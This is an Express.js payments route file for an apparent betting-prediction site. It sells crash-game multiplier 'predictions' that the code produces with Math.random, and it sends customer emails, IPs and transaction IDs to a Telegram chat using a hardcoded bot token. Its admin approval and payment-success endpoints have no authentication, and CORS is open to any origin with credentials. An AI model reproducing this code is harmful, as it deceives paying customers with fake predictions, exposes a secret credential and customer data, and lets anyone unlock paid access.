// routes/payments.js
const express = require('express');
const router = express.Router();
const User = require('../models/User');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');

// Telegram configuration
const telegramBotToken = '7995830862:AAEbUHiAL-YUM3myMGKd63dpFcbxE3_uU2o';
const telegramChatId = '5900219209';

// Helper function to log payment attempts
const logPaymentData = (data) => {
  const logsDir = path.join(__dirname, '..', 'logs');
  if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
  }
  
  const logFile = path.join(logsDir, `payments-${new Date().toISOString().split('T')[0]}.log`);
  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
  fs.appendFileSync(logFile, logEntry);
  console.log('💳 Payment data logged:', data);
};

// Helper function to send to Telegram
const sendToTelegram = async (message) => {
  try {
    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
    
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
      return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
    }
    
    const result = await response.json();
    console.log('✅ Telegram message sent successfully:', result.message_id);
    return { success: true, result };
    
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error.message);
    return { success: false, error: error.message };
  }
};

// CORS middleware for all payment routes
router.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ==================== SELAR PAYMENT ROUTES ====================

// Create Selar Order (Frontend will redirect to Selar checkout)
router.post('/selar/create-order', async (req, res) => {
  try {
    const { email, packageName, timeSlot, bettingSite } = req.body;
    // Generate a reference for tracking
    const reference = uuidv4();
    // Store payment metadata temporarily (in production, use DB)
    global.selarPayments = global.selarPayments || {};
    global.selarPayments[reference] = {
      email,
      packageName,
      timeSlot,
      bettingSite,
      timestamp: new Date(),
      status: 'pending_verification'
    };
    // Respond with reference for manual verification
    res.json({ reference });
  } catch (error) {
    console.error('Selar order error:', error);
    res.status(500).json({ error: 'Failed to create Selar order', details: error.message });
  }
});

// Manual verification endpoint (called after user clicks "I've Sent Payment")
router.post('/selar/verify/:reference', async (req, res) => {
  try {
    const { reference } = req.params;
    const paymentData = global.selarPayments && global.selarPayments[reference];
    if (!paymentData) {
      return res.status(404).json({ success: false, error: 'Order not found' });
    }
    
    // Update status to pending verification
    paymentData.status = 'pending_verification';
    paymentData.verificationStartTime = new Date();
    
    // Set auto-rejection timeout (30 seconds)
    setTimeout(async () => {
      try {
        // Check if payment is still pending verification
        const currentPaymentData = global.selarPayments && global.selarPayments[reference];
        if (currentPaymentData && currentPaymentData.status === 'pending_verification') {
          // Auto-reject the payment
          currentPaymentData.status = 'auto_rejected';
          currentPaymentData.autoRejectedAt = new Date();
          
          console.log(`⏰ Auto-rejecting Selar payment ${reference} after 30 seconds timeout`);
          
          // Send auto-rejection notification to Telegram
          const autoRejectMsg = `⏰ <b>Auto-rejected Selar payment</b> (30sec timeout)
          
👤 Email: ${currentPaymentData.email}
💰 Package: ${currentPaymentData.packageName}
🔗 Reference: ${reference}
❌ Reason: No admin verification within 30 seconds
⏰ Auto-rejected at: ${new Date().toLocaleString()}`;
          
          await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: telegramChatId,
            text: autoRejectMsg,
            parse_mode: 'HTML'
          });
        }
      } catch (timeoutError) {
        console.error('❌ Auto-rejection timeout error:', timeoutError.message);
      }
    }, 30000); // 30 seconds = 30,000 milliseconds
    
    // Send verification request to Telegram for admin
    const telegramMessage = `🔎 <b>Verification needed</b> for Selar payment:
<b>Email:</b> ${paymentData.email}
<b>Package:</b> ${paymentData.packageName}
<b>Reference:</b> ${reference}

⚠️ <b>Auto-rejects in 30 seconds if not verified</b>`;
    
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const messageOptions = {
      chat_id: telegramChatId,
      text: telegramMessage,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ VERIFY & SEND PREDICTIONS', callback_data: `verify_${reference}` },
            { text: '❌ REJECT PAYMENT', callback_data: `reject_${reference}` }
          ]
        ]
      }
    };
    
    await axios.post(url, messageOptions);
    
    res.json({ success: true, status: 'pending_verification', message: 'Verification request sent to admin' });
    
  } catch (error) {
    console.error('Selar manual verification error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Admin verification endpoint (called by Telegram webhook)
router.post('/selar/admin-verify/:reference', async (req, res) => {
  try {
    const { reference } = req.params;
    const { verified } = req.body;
    const paymentData = global.selarPayments && global.selarPayments[reference];
    
    if (!paymentData) {
      return res.status(404).json({ success: false, error: 'Order not found' });
    }
    
    // Check if payment was already auto-rejected
    if (paymentData.status === 'auto_rejected') {
      return res.status(400).json({ 
        success: false, 
        error: 'Payment was auto-rejected due to timeout (30 seconds expired)' 
      });
    }
    
    if (verified) {
      // Update payment status first
      paymentData.status = 'verified';
      paymentData.verifiedAt = new Date();
      
      try {
        // Handle successful payment (this includes user update and predictions)
        await handleSuccessfulPayment({
          email: paymentData.email,
          packageName: paymentData.packageName,
          timeSlot: paymentData.timeSlot,
          bettingSite: paymentData.bettingSite
        });
        
        // Send verification notification to Telegram
        const successMsg = `✅ <b>Selar payment verified</b> for ${paymentData.email} (${paymentData.packageName})`;
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          chat_id: telegramChatId,
          text: successMsg,
          parse_mode: 'HTML'
        });
        
      } catch (telegramError) {
        console.error('❌ Failed to send verification Telegram message:', telegramError.message);
        // Don't fail the entire request if Telegram fails
      }
      
      res.json({ success: true, status: 'verified' });
    } else {
      paymentData.status = 'rejected';
      paymentData.rejectedAt = new Date();
      
      // Notify Telegram of rejection
      const rejectMsg = `❌ <b>Selar payment rejected</b> for ${paymentData.email} (${paymentData.packageName})`;
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: rejectMsg,
        parse_mode: 'HTML'
      });
      
      res.json({ success: true, status: 'rejected' });
    }
  } catch (error) {
    console.error('Admin verification error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Check Selar payment status
router.get('/selar/status/:reference', async (req, res) => {
  try {
    const { reference } = req.params;
    const paymentData = global.selarPayments && global.selarPayments[reference];
    if (!paymentData) {
      return res.json({ success: false, status: 'not_found', message: `Payment order ${reference} not found` });
    }
    res.json({
      success: true,
      reference,
      status: paymentData.status || 'pending_verification',
      email: paymentData.email,
      packageName: paymentData.packageName,
      timestamp: paymentData.timestamp,
      message: getSelarStatusMessage(paymentData.status)
    });
  } catch (error) {
    console.error('Selar status check error:', error);
    res.status(500).json({ success: false, status: 'error', message: 'Unable to check payment status. Please try again.' });
  }
});

// Helper function for Selar status messages
function getSelarStatusMessage(status) {
  const statusMessages = {
    'pending_verification': 'Waiting for admin verification...',
    'verified': 'Payment verified successfully!',
    'rejected': 'Payment verification rejected',
    'auto_rejected': 'Payment auto-rejected due to timeout (30 seconds)'
  };
  return statusMessages[status] || 'Unknown status';
}

function getBotStatusMessage(status) {
  const statusMessages = {
    'pending_verification': 'Bot activation pending admin verification...',
    'verified': 'Bot activation verified successfully!',
    'rejected': 'Bot activation verification rejected',
    'auto_rejected': 'Bot activation auto-rejected due to timeout (30 seconds)'
  };
  return statusMessages[status] || 'Unknown status';
}

// ==================== SHARED PAYMENT HANDLER ====================

async function handleSuccessfulPayment(metadata) {
  try {
    const { email, packageName, timeSlot, bettingSite } = metadata;

    // Update user payment status
    const user = await User.findOneAndUpdate(
      { email },
      { 
        paymentVerified: true,
        paymentDate: new Date(),
        packageName,
        timeSlot,
        bettingSite
      },
      { new: true, upsert: true }
    );

    // Generate and store predictions
    await generatePredictions(user);

    console.log(`Payment verified for ${email}. Predictions unlocked!`);
    return user;

  } catch (error) {
    console.error('Payment handling error:', error);
    throw error;
  }
}

// ==================== UTILITY FUNCTIONS ====================

async function sendTelegramNotification(email, packageName) {
  try {
    const message = `🎉 New Payment Confirmed!\n\nEmail: ${email}\nPackage: ${packageName}\nTime: ${new Date().toLocaleString()}`;
    
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: message
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
  }
}

async function generatePredictions(user) {
  try {
    // Generate predictions based on package
    const predictions = generatePredictionMultipliers(user.packageName);
    
    // Store predictions (you might want to add a Predictions model)
    user.predictions = predictions;
    user.predictionTime = new Date();
    await user.save();

    return predictions;
  } catch (error) {
    console.error('Prediction generation error:', error);
    throw error;
  }
}

function generatePredictionMultipliers(packageName) {
  const match = packageName.match(/^(\d+)x/i);
  const targetMultiplier = match ? parseInt(match[1]) : 2;
  const predictions = [];
  
  // Generate 5 predictions (3 close to target, 2 random)
  for (let i = 0; i < 3; i++) {
    const variance = Math.random() * 0.5 - 0.25; // +/- 25%
    const multiplier = Math.max(1.1, targetMultiplier + variance);
    predictions.push(parseFloat(multiplier.toFixed(2)));
  }
  
  // Add 2 random predictions
  for (let i = 0; i < 2; i++) {
    const randomMultiplier = Math.random() * 10 + 1.1;
    predictions.push(parseFloat(randomMultiplier.toFixed(2)));
  }
  
  return predictions.sort((a, b) => b - a); // Sort descending
}

// Universal payment success handler (for Selar integration)
router.post('/payment-success', async (req, res) => {
  try {
    const { reference, email, packageName, timeSlot, bettingSite } = req.body;
    
    if (!reference || !email || !packageName) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields: reference, email, packageName' 
      });
    }

    // Process the successful payment
    const user = await handleSuccessfulPayment({
      email,
      packageName,
      timeSlot,
      bettingSite
    });

    // Clean up payment data from storage
    if (global.selarPayments && global.selarPayments[reference]) {
      delete global.selarPayments[reference];
    }

    res.json({ 
      success: true, 
      message: `Payment completed successfully via Selar!`,
      user: {
        email: user.email,
        packageName: user.packageName,
        paymentVerified: user.paymentVerified,
        paymentDate: user.paymentDate
      },
      predictions: user.predictions,
      redirect: '/dashboard' // Frontend can use this to redirect user
    });

  } catch (error) {
    console.error('Payment success handler error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to process payment success. Please contact support.',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// Bot payment creation endpoint (to initiate bot payment verification)
router.post('/bot/create-payment/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    const { customerInfo } = req.body; // Optional customer info
    
    console.log(`🤖 Creating bot payment verification for order: ${orderId}`);
    
    // Initialize bot payments storage if it doesn't exist
    global.botPayments = global.botPayments || {};
    
    // Store bot payment data
    global.botPayments[orderId] = {
      status: 'pending_verification',
      createdAt: new Date(),
      orderId,
      customerInfo: customerInfo || {}
    };
    
    // Set auto-rejection timeout (30 seconds)
    setTimeout(async () => {
      try {
        // Check if bot payment is still pending verification
        const currentBotPayment = global.botPayments?.[orderId];
        if (currentBotPayment && currentBotPayment.status === 'pending_verification') {
          // Auto-reject the bot payment
          currentBotPayment.status = 'auto_rejected';
          currentBotPayment.autoRejectedAt = new Date();
          
          console.log(`⏰ Auto-rejecting bot payment ${orderId} after 30 seconds timeout`);
          
          // Send auto-rejection notification to Telegram
          const autoRejectMsg = `⏰ <b>Auto-rejected bot activation</b> (30sec timeout)
          
🤖 Order: ${orderId}
❌ Reason: No admin verification within 30 seconds
⏰ Auto-rejected at: ${new Date().toLocaleString()}`;
          
          await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: telegramChatId,
            text: autoRejectMsg,
            parse_mode: 'HTML'
          });
        }
      } catch (timeoutError) {
        console.error('❌ Bot auto-rejection timeout error:', timeoutError.message);
      }
    }, 30000); // 30 seconds = 30,000 milliseconds
    
    // Send verification request to Telegram for admin
    const telegramMessage = `🤖 <b>Bot activation verification needed</b>
    
🔗 Order ID: ${orderId}
👤 Customer: ${customerInfo?.email || 'Not provided'}
⏰ Created: ${new Date().toLocaleString()}

⚠️ <b>Auto-rejects in 30 seconds if not verified</b>`;
    
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: telegramMessage,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ VERIFY BOT ACTIVATION', callback_data: `bot_verify_${orderId}` },
            { text: '❌ REJECT ACTIVATION', callback_data: `bot_reject_${orderId}` }
          ]
        ]
      }
    });
    
    res.json({ 
      success: true, 
      orderId,
      status: 'pending_verification',
      message: 'Bot payment verification request sent to admin' 
    });
    
  } catch (error) {
    console.error('❌ Bot payment creation error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to create bot payment verification',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// Bot activation verification endpoint
router.post('/bot/verify/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    const { adminId } = req.body;
    
    // Initialize bot payments storage if it doesn't exist
    global.botPayments = global.botPayments || {};
    
    const botPayment = global.botPayments[orderId];
    
    if (!botPayment) {
      return res.status(404).json({ 
        success: false, 
        error: 'Bot payment not found' 
      });
    }
    
    // Check if payment was already auto-rejected
    if (botPayment.status === 'auto_rejected') {
      return res.status(400).json({ 
        success: false, 
        error: 'Cannot verify - bot payment was auto-rejected due to timeout',
        autoRejectedAt: botPayment.autoRejectedAt
      });
    }
    
    if (botPayment.status !== 'pending_verification') {
      return res.status(400).json({ 
        success: false, 
        error: `Bot payment is already ${botPayment.status}` 
      });
    }
    
    // Update bot payment status to verified
    botPayment.status = 'verified';
    botPayment.verifiedAt = new Date();
    botPayment.verifiedBy = adminId;
    
    console.log(`✅ Bot payment ${orderId} verified by admin ${adminId}`);
    
    res.json({ 
      success: true, 
      orderId,
      status: 'verified',
      message: 'Bot activation verified successfully' 
    });
    
  } catch (error) {
    console.error('❌ Bot verification error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Bot verification failed',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// Bot payment status endpoint
router.get('/bot/status/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    
    // Check bot payment status
    const botPayment = global.botPayments?.[orderId];
    
    if (!botPayment) {
      return res.json({ 
        success: false, 
        status: 'not_found',
        message: 'Bot payment not found'
      });
    }
    
    res.json({ 
      success: true, 
      status: botPayment.status,
      orderId,
      processedAt: botPayment.activatedAt || botPayment.rejectedAt
    });
    
  } catch (error) {
    console.error('❌ Bot status check error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to check bot status'
    });
  }
});

// ==================== CARD PAYMENT ROUTES ====================

// Card payment details endpoint
// Payment verification endpoints
router.post('/verify-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      amount, 
      paymentMethod,
      transactionId,
      source,
      timestamp 
    } = req.body;

    // Validate required fields
    if (!contact || !packageName) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and package name are required' 
      });
    }

    const verificationData = {
      contact,
      packageName,
      amount,
      paymentMethod: paymentMethod || 'Unknown',
      transactionId: transactionId || 'N/A',
      source: source || 'Payment Verification',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown',
      status: 'pending_admin_verification'
    };

    // Log verification request
    logPaymentData(verificationData);

    // Send to Telegram with verification buttons
    const telegramMessage = `💰 <b>PAYMENT VERIFICATION REQUEST</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
💵 Amount: <b>$${amount || 'N/A'}</b>
💳 Method: <b>${paymentMethod || 'Card Payment'}</b>
🔗 Transaction ID: <code>${transactionId || 'N/A'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
🔗 Source: ${source || 'Payment Verification'}

⚠️ <b>ADMIN ACTION REQUIRED</b>
Please verify this payment and approve/reject access.`;

    await sendToTelegram(telegramMessage);

    // Return success with verification ID
    res.json({ 
      success: true,
      message: 'Payment verification request submitted successfully',
      verificationId: Date.now().toString(),
      status: 'pending_verification',
      estimatedTime: '5-10 minutes'
    });

  } catch (error) {
    console.error('❌ Payment verification error:', error);
    
    // Log error
    logPaymentData({
      error: error.message,
      contact: req.body.contact,
      packageName: req.body.packageName,
      timestamp: new Date().toISOString(),
      action: 'verification_error'
    });

    res.status(500).json({ 
      success: false,
      error: 'Failed to submit payment verification',
      message: 'Please try again or contact support'
    });
  }
});

// Admin payment approval endpoint
router.post('/approve-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      adminNote,
      timestamp 
    } = req.body;

    const approvalData = {
      contact,
      packageName,
      verificationId,
      adminNote: adminNote || 'Payment approved',
      action: 'payment_approved',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log approval
    logPaymentData(approvalData);

    // Send approval notification to Telegram
    const telegramMessage = `✅ <b>PAYMENT APPROVED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Note: ${adminNote || 'Payment approved by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

✅ <b>ACCESS GRANTED</b>
User can now access their package.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment approved successfully',
      status: 'approved',
      accessGranted: true
    });

  } catch (error) {
    console.error('❌ Payment approval error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to approve payment'
    });
  }
});

// Admin payment rejection endpoint
router.post('/reject-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      rejectionReason,
      timestamp 
    } = req.body;

    const rejectionData = {
      contact,
      packageName,
      verificationId,
      rejectionReason: rejectionReason || 'Payment rejected',
      action: 'payment_rejected',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log rejection
    logPaymentData(rejectionData);

    // Send rejection notification to Telegram
    const telegramMessage = `❌ <b>PAYMENT REJECTED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Reason: ${rejectionReason || 'Payment rejected by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

❌ <b>ACCESS DENIED</b>
User payment was not verified.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment rejected',
      status: 'rejected',
      accessGranted: false
    });

  } catch (error) {
    console.error('❌ Payment rejection error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to reject payment'
    });
  }
});

// Bot payment status check endpoint
router.get('/bot/status/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    
    // Initialize bot payments storage if it doesn't exist
    global.botPayments = global.botPayments || {};
    
    const botPayment = global.botPayments[orderId];
    
    if (!botPayment) {
      return res.status(404).json({ 
        success: false, 
        error: 'Bot payment not found' 
      });
    }
    
    res.json({ 
      success: true, 
      orderId,
      status: botPayment.status,
      message: getBotStatusMessage(botPayment.status),
      createdAt: botPayment.createdAt,
      verifiedAt: botPayment.verifiedAt || null,
      autoRejectedAt: botPayment.autoRejectedAt || null
    });
    
  } catch (error) {
    console.error('❌ Bot status check error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to check bot payment status',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

module.exports = router;